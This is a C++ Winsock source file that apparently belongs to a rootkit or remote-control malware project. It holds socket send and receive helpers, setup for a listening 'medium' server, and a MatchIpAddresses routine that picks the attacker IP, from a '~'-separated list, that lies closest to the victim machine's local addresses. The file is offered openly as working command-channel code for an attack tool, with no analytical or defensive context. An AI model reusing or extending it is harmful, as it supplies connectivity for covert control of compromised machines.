#include "internet.h"


BOOL IsQuickTerminate(PASS_DATA result) {
    return result.err && (result.value == 10054 || result.value == 10060 || result.value == 10053 || result.value == 0);
}


PASS_DATA root_internet::RecvData(SOCKET GetFrom, int Size, PVOID ToBuf, BOOL Silent, int Flags, LogFile* MediumLog) {
    PASS_DATA RecvDataResult;

    // Receive data:
    int ReceiveResult = recv(GetFrom, (char*)ToBuf, Size, Flags);
    if (ReceiveResult > 0) {

        // size > 0 = received some data:
        RecvDataResult.err = FALSE;
        RecvDataResult.value = ReceiveResult;
        if (!Silent) {
            printf("Successfully received %u bytes of data\n", ReceiveResult);
            if (ReceiveResult != Size) {
                printf("Mismatch between sizes (expected %llu, received %llu)\n", (ULONG64)Size, (ULONG64)ReceiveResult);
            }
        }
    }

    else if (ReceiveResult == 0) {

        // size = 0 = did not receive any data:
        RecvDataResult.err = TRUE;
        RecvDataResult.value = ReceiveResult;
        if (!Silent) {
            RequestHelpers::LogMessage("Socket connection to sending socket was closed while receiving data\n", MediumLog, FALSE, 0);
        }
    }

    else {

        // size < 0 = error:
        RecvDataResult.err = TRUE;
        RecvDataResult.value = WSAGetLastError();
        if (!Silent) {
            RequestHelpers::LogMessage("Error receiving data from sending socket\n", MediumLog, TRUE, RecvDataResult.value);
        }
    }

    RecvDataResult.Term = IsQuickTerminate(RecvDataResult);
    return RecvDataResult;
}


PASS_DATA root_internet::SendData(SOCKET SendTo, PVOID SrcData, int Size, BOOL Silent, int Flags, LogFile* MediumLog) {
    PASS_DATA SendDataResult = { 0 };


    // Send data:
    int SendResult = send(SendTo, (char*)SrcData, Size, Flags);
    if (SendResult == SOCKET_ERROR) {
        SendDataResult.value = WSAGetLastError();
        SendDataResult.err = TRUE;
        if (!Silent) {
            RequestHelpers::LogMessage("Error sending data\n", MediumLog, TRUE, SendDataResult.value);
        }
    }
    else {
        SendDataResult.value = SendResult;
        SendDataResult.err = FALSE;
        if (!Silent) {
            printf("Successfully sent %llu bytes\n", (ULONG64)SendDataResult.value);
        }
    }
    SendDataResult.Term = IsQuickTerminate(SendDataResult);
    return SendDataResult;
}


BOOL root_internet::GetString(SOCKET tosock, char** String, LogFile* MediumLog) {
    ULONG StringSize = 0;
    char MallocConfirm = 0;
    PASS_DATA SocketResult = { 0 };

    if (String == NULL || MediumLog == NULL) {
        root_internet::SendData(tosock, &MallocConfirm, sizeof(MallocConfirm), FALSE, 0, MediumLog);
        return FALSE;  // MallocConfirm = 0: medium was not able to allocate memory for string
    }
    SocketResult = root_internet::RecvData(tosock, sizeof(StringSize), &StringSize, FALSE, 0, MediumLog);
    if (SocketResult.err || SocketResult.value != sizeof(StringSize)) {
        return FALSE;
    }
    *String = (char*)malloc(StringSize);
    if (*String != NULL) {
        MallocConfirm = 1;  // Malloc has succeeded
    }
    SocketResult = root_internet::SendData(tosock, &MallocConfirm, sizeof(MallocConfirm), FALSE, 0, MediumLog);
    if (SocketResult.err || SocketResult.value != sizeof(MallocConfirm) || MallocConfirm == 0) {
        if (*String != NULL) {
            free(*String);
        }
        return FALSE;  // MallocConfirm = 0: no need to continue as malloc() failed
    }
    SocketResult = root_internet::RecvData(tosock, StringSize, (PVOID)*String, FALSE, 0, MediumLog);
    if (SocketResult.err || SocketResult.value != StringSize) {
        return FALSE;
    }
    return TRUE;
}


NETWORK_INFO root_internet::InitNetInfo(sockaddr_in AddressInfo, USHORT Port, const char* IP, SOCKET Socket) {
    NETWORK_INFO Info = { 0 };


    // ASSUMES - AddressInfo is populated correctly (port number, ipv4, value of ip address):
    Info.AddrInfo = AddressInfo;
    Info.IP = IP;
    Info.Port = Port;
    Info.AsoSock = Socket;
    return Info;
}


void root_internet::CleanNetStack(SOCKET SocketToClean, LogFile* MediumLog) {
    char LastChr = NULL;
    PASS_DATA RecvResult = { 0 };
    ULONG LastBytes = 0;
    BOOL RecvError = FALSE;

    int UnreceivedDataSize = ioctlsocket(SocketToClean, FIONREAD, &LastBytes);  // Get size of unreceived data in network stack
    if (UnreceivedDataSize == 0) {
        while (LastBytes > 0) {
            RecvResult = RecvData(SocketToClean, 1, &LastChr, TRUE, 0, MediumLog);
            if (RecvResult.err) {
                RequestHelpers::LogMessage("Could not get the last bytes out of the network stack\n", MediumLog, TRUE, WSAGetLastError());
                RecvError = TRUE;
                break;
            }

            if (RecvResult.value <= 0) {
                break;
            }
            LastBytes -= RecvResult.value;
        }
        if (!RecvError) {
            RequestHelpers::LogMessage("Network stack freed\n", MediumLog, FALSE, 0);
        }
    }
    else {
        RequestHelpers::LogMessage("Could not get the amount of bytes to clear from network stack\n", MediumLog, TRUE, WSAGetLastError());
    }
}


void root_internet::SetNetStructs(const char* SrvIP, const char* SndIP, USHORT SrvPort, USHORT SndPort, NETWORK_INFO* NetArr) {
    sockaddr_in MediumAddress = { 0 };
    sockaddr_in ClientAddress = { 0 };


    // Medium information:
    MediumAddress.sin_family = AF_INET;
    MediumAddress.sin_port = SrvPort;
    inet_pton(AF_INET, SrvIP, &(MediumAddress.sin_addr));
    NetArr[0] = InitNetInfo(MediumAddress, SrvPort, SrvIP, NULL);


    // Client information:
    ClientAddress.sin_family = AF_INET;
    ClientAddress.sin_port = SndPort;
    inet_pton(AF_INET, SndIP, &(ClientAddress.sin_addr));
    NetArr[1] = InitNetInfo(ClientAddress, SndPort, SndIP, NULL);
    NetArr[2] = InitNetInfo(ClientAddress, SndPort, SndIP, NULL);
}


BOOL root_internet::StartComms(NETWORK_INFO* NetArr, LogFile* MediumLog) {
    WSADATA WSAData = { 0 };
    SOCKET MediumSocket = 0;


    // Initialize Winsock (required for using sockets and socket functions):
    if (WSAStartup(MAKEWORD(2, 2), &WSAData) != 0) {
        RequestHelpers::LogMessage("Winsock initialization process failed\n", MediumLog, TRUE, WSAGetLastError());
        return FALSE;
    }


    // Create medium socket:
    MediumSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (MediumSocket == INVALID_SOCKET) {
        RequestHelpers::LogMessage("Could not create socket object\n", MediumLog, TRUE, WSAGetLastError());
        WSACleanup();
        return FALSE;
    }
    NetArr[0].AsoSock = MediumSocket;



    // Bind medium socket:
    if (bind(NetArr[0].AsoSock, (sockaddr*)&NetArr[0].AddrInfo, sizeof(sockaddr)) == SOCKET_ERROR) {
        RequestHelpers::LogMessage("Could not bind socket object\n", MediumLog, TRUE, WSAGetLastError());
        closesocket(NetArr[0].AsoSock);
        WSACleanup();
        return FALSE;
    }



    // Listen with socket for requests - (backlog is the amount of maxixum listening connections at a time):
    if (listen(NetArr[0].AsoSock, 2) == SOCKET_ERROR) {
        RequestHelpers::LogMessage("Could not start listening with socket object\n", MediumLog, TRUE, WSAGetLastError());
        closesocket(NetArr[0].AsoSock);
        WSACleanup();
        return FALSE;
    }
    return TRUE;
}


DWORD address_config::CompareIpAddresses(char* LocalHost, const char* RemoteAddr) {
    DWORD Score = 0;
    DWORD LocalInd = 0;
    DWORD RemoteInd = 0;
    DWORD MaskValue = 0x80;
    DWORD CurrMask = 0x80;
    DWORD MatchingFields = 0;
    DWORD LocalNumeric = 0;
    DWORD RemoteNumeric = 0;

    while (MatchingFields != 4) {
        while (LocalHost[LocalInd] != '.' && LocalHost[LocalInd] != '\0') {
            LocalNumeric *= 10;
            LocalNumeric += (LocalHost[LocalInd] - 0x30);
            LocalInd++;
        }

        while (RemoteAddr[RemoteInd] != '.' && RemoteAddr[RemoteInd] != '\0') {
            RemoteNumeric *= 10;
            RemoteNumeric += (RemoteAddr[RemoteInd] - 0x30);
            RemoteInd++;
        }

        while (CurrMask != 0) {
            if ((RemoteNumeric & CurrMask) == (LocalNumeric & CurrMask)) {
                Score++;
            }
            else {
                return Score;
            }
            CurrMask /= 2;
        }
        RemoteInd++;
        LocalInd++;
        MatchingFields++;
        LocalNumeric = 0;
        RemoteNumeric = 0;
        CurrMask = MaskValue;
    }
    return Score;  // If got here - 32, probably not possible, exactly like current IP address
}


BOOL address_config::MatchIpAddresses(char* TargetAddress, char* AttackerAddress, const char* AttackerIps) {
    char LocalHostName[80];
    char* CurrentIP = NULL;
    char CurrentAttackerIP[MAXIPV4_ADDRESS_SIZE] = { 0 };
    in_addr CurrentAddress = { 0 };
    hostent* LocalIpsList = NULL;
    DWORD CompareScore = 0;
    DWORD CurrentScore = 0;
    DWORD AddrIndex = 0;
    DWORD AttackIndex = 0;
    WSADATA SockData = { 0 };
    if (WSAStartup(MAKEWORD(2, 2), &SockData) != 0) {
        return FALSE;
    }


    // Get the hostname of the local machine to get ip addresses:
    if (gethostname(LocalHostName, sizeof(LocalHostName)) == SOCKET_ERROR) {
        WSACleanup();
        return FALSE;
    }
    LocalIpsList = gethostbyname(LocalHostName);
    if (LocalIpsList == 0) {
        WSACleanup();
        return FALSE;
    }


    // Find the address pair with the most similar bits in the address:
    while (AddrIndex < strlen(AttackerIps)) {
        while (AttackerIps[AddrIndex] != '~' && AttackerIps[AddrIndex] != '\0') {
            CurrentAttackerIP[AttackIndex] = AttackerIps[AddrIndex];
            AddrIndex++;
            AttackIndex++;
        }
        CurrentAttackerIP[AttackIndex] = '\0';
        AttackIndex = 0;
        if (AttackerIps[AddrIndex] == '~') {
            AddrIndex++;
        }

        for (int AddressListIndex = 0; LocalIpsList->h_addr_list[AddressListIndex] != 0; ++AddressListIndex) {
            memcpy(&CurrentAddress, LocalIpsList->h_addr_list[AddressListIndex], sizeof(in_addr));
            CurrentIP = inet_ntoa(CurrentAddress);
            CurrentScore = CompareIpAddresses(CurrentIP, CurrentAttackerIP);
            if (CurrentScore > CompareScore) {
                CompareScore = CurrentScore;
                RtlZeroMemory(TargetAddress, MAXIPV4_ADDRESS_SIZE);
                RtlZeroMemory(AttackerAddress, MAXIPV4_ADDRESS_SIZE);
                memcpy(TargetAddress, CurrentIP, strlen(CurrentIP) + 1);
                memcpy(AttackerAddress, CurrentAttackerIP, strlen(CurrentAttackerIP) + 1);
            }
        }
    }

    WSACleanup();
    return TRUE;
}